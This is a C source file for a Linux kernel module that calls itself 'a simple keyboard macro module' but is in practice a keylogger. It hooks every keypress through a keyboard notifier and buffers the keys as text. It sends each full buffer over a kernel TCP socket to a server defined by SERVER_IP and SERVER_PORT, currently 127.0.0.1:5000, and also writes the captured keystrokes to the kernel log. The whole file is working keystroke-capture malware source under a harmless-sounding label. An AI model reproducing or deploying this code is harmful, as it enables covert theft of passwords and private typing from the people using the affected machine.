#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/input.h>
#include <linux/hid.h>
#include <linux/keyboard.h>
#include <linux/uaccess.h>
#include <linux/socket.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/bitmap.h>

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 5000
#define BUFFER_SIZE 256
#define MAX_KEYCODE 255

static DECLARE_BITMAP(key_states, MAX_KEYCODE + 1);

static const char *keymap[MAX_KEYCODE + 1] = {
    [KEY_A] = "a", [KEY_B] = "b", [KEY_C] = "c", [KEY_D] = "d",
    [KEY_E] = "e", [KEY_F] = "f", [KEY_G] = "g", [KEY_H] = "h",
    [KEY_I] = "i", [KEY_J] = "j", [KEY_K] = "k", [KEY_L] = "l",
    [KEY_M] = "m", [KEY_N] = "n", [KEY_O] = "o", [KEY_P] = "p",
    [KEY_Q] = "q", [KEY_R] = "r", [KEY_S] = "s", [KEY_T] = "t",
    [KEY_U] = "u", [KEY_V] = "v", [KEY_W] = "w", [KEY_X] = "x",
    [KEY_Y] = "y", [KEY_Z] = "z",
    [KEY_1] = "1", [KEY_2] = "2", [KEY_3] = "3", [KEY_4] = "4",
    [KEY_5] = "5", [KEY_6] = "6", [KEY_7] = "7", [KEY_8] = "8",
    [KEY_9] = "9", [KEY_0] = "0",
    [KEY_SPACE] = "SPACE", [KEY_ENTER] = "ENTER", [KEY_ESC] = "ESC",
    [KEY_TAB] = "TAB", [KEY_LEFTSHIFT] = "LSHIFT", [KEY_RIGHTSHIFT] = "RSHIFT",
    [KEY_LEFTCTRL] = "LCTRL", [KEY_RIGHTCTRL] = "RCTRL",
    [KEY_LEFTALT] = "LALT", [KEY_RIGHTALT] = "RALT",
    [KEY_BACKSPACE] = "BACKSPACE", [KEY_CAPSLOCK] = "CAPSLOCK",
    [KEY_F1] = "F1", [KEY_F2] = "F2", [KEY_F3] = "F3", [KEY_F4] = "F4",
    [KEY_F5] = "F5", [KEY_F6] = "F6", [KEY_F7] = "F7", [KEY_F8] = "F8",
    [KEY_F9] = "F9", [KEY_F10] = "F10", [KEY_F11] = "F11", [KEY_F12] = "F12",
    [KEY_UP] = "UP", [KEY_DOWN] = "DOWN", [KEY_LEFT] = "LEFT", [KEY_RIGHT] = "RIGHT",
    [KEY_HOME] = "HOME", [KEY_END] = "END", [KEY_PAGEUP] = "PAGEUP", [KEY_PAGEDOWN] = "PAGEDOWN",
    [KEY_INSERT] = "INSERT", [KEY_DELETE] = "DELETE",
};

char message[BUFFER_SIZE];
static int message_len = 0;
static struct socket *sock;
static struct sockaddr_in s_addr;
short shift_pressed = 0;

// static short get_capslock_state(void)
// {
//     struct input_dev *keyboard_dev;
//     short caps_state = 0;

//     // Pobierz urządzenie klawiatury
//     keyboard_dev = input_get_device();
//     if (!keyboard_dev) {
//         pr_err("Can't find the device\n");
//         return -1;
//     }

//     caps_state = test_bit(LED_CAPSL, keyboard_dev->led);

//     // Free device
//     input_put_device(keyboard_dev);

//     return caps_state;
//}

// Function to send data to the server
static int send_data_to_server(const char *data)
{
    struct kvec vec;
    struct msghdr msg;
    int ret;

    memset(&msg, 0, sizeof(msg));
    vec.iov_base = (void *)data;
    vec.iov_len = strlen(data);

    ret = kernel_sendmsg(sock, &msg, &vec, 1, strlen(data));
    if (ret < 0) {
        pr_err("Failed to send data: %d\n", ret);
    }

    return ret;
}

static int keyboard_event(struct notifier_block *nb, unsigned long code, void *param)
{
    struct keyboard_notifier_param *kp = param;

    if (kp->down && kp->value >= 0 && kp->value <= MAX_KEYCODE) {
        const char *key_char = keymap[kp->value];
        if (key_char) {
            int key_len = strlen(key_char);
            if (message_len + key_len > BUFFER_SIZE) {
                send_data_to_server(message);
                pr_info("Data sent to server: %s", message);
                memset(message, 0, BUFFER_SIZE);
                message_len = 0;
            }

            char display_char = key_char[0];
            if (shift_pressed && display_char >= 'a' && display_char <= 'z') {
                display_char = display_char - 'a' + 'A';  // Convert to uppercase
                snprintf(message + message_len, BUFFER_SIZE - message_len, "%c", display_char); // Append character
            
            } else if(display_char >= 'a' && display_char <= 'z'){ //character
                snprintf(message + message_len, BUFFER_SIZE - message_len, "%c", display_char); // Append character
            }
            else{ //special string f.e. "SPACE"
                snprintf(message + message_len, BUFFER_SIZE - message_len, " %s ", key_char); // Append string without spaces
            }
            message_len += strlen(message + message_len);
            pr_info("Data: %s, size: %d", message, message_len);
        }
    }

    return NOTIFY_OK;
}


static struct notifier_block keyboard_nb = {
    .notifier_call = keyboard_event
};

static int __init keyboard_macro_init(void)
{
    int ret;
    memset(message, 0, BUFFER_SIZE);

    ret = register_keyboard_notifier(&keyboard_nb);
    if (ret) {
        pr_err("Failed to register keyboard notifier\n");
        return ret;
    }

    // Set up socket
    memset(&s_addr, 0, sizeof(s_addr));
    s_addr.sin_family = AF_INET;
    s_addr.sin_port = htons(SERVER_PORT);
    s_addr.sin_addr.s_addr = in_aton(SERVER_IP);

    ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
    if (ret) {
        pr_err("Failed to create socket\n");
        unregister_keyboard_notifier(&keyboard_nb);
        return ret;
    }

    ret = kernel_connect(sock, (struct sockaddr *)&s_addr, sizeof(s_addr), 0);
    if (ret) {
        pr_err("Failed to connect to server\n");
        sock_release(sock);
        unregister_keyboard_notifier(&keyboard_nb);
        return ret;
    }

    pr_info("Keyboard macro module loaded\n");
    return 0;
}

static void __exit keyboard_macro_exit(void)
{
    unregister_keyboard_notifier(&keyboard_nb);
    if (sock)
        sock_release(sock);

    memset(message, 0, BUFFER_SIZE);
    pr_info("Keyboard macro module unloaded\n");
}

module_init(keyboard_macro_init);
module_exit(keyboard_macro_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("A simple keyboard macro module");